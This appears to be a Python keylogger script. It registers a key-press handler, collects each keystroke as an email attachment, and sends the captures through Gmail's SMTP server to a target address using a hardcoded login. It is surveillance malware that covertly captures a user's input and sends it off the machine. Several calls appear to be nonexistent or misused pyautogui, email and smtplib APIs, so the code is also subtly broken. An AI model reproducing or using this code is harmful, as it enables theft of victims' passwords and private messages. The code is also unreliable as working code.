import pyautogui
import smtplib, ssl
from email.message import EmailMessage

# define target email address
target_email = "target email address"

# create email message for sending keystrokes
em = EmailMessage()

# function to be called when key is pressed
def on_key_press(key):
    em.attach_byte_string(f"Key pressed: {key}", name=f"Keystroke_{key}")

# start key logging
pyautogui.startMouseListener(on_key_press)

# function to send captured keystrokes via email
def send_keystrokes():
    context = ssl.create_default_context()
    with smtplib.SMTP("smtp.gmail.com", 587, context=context) as server:
        server.starttls()
        server.login("your_email_address", "your_email_hardcoded_password")
        for attachment in em.attachments:
            body = attachment.get_payload().decode("utf-8")
            msg = EmailMessage()
            msg.set_content(body)
            msg["Subject"] = f"Capture: {attachment.get_name()}"
            msg["From"] = "your mail"
            msg["To"] = target_email
            with context.wrap_socket(server, server_hostname="smtp.gmail.com") as wrapped_socket:
                server.send_message(msg, wrapper=wrapped_socket)

# function to stop key logging
def stop_key_logging():
    pyautogui.stopMouseListener()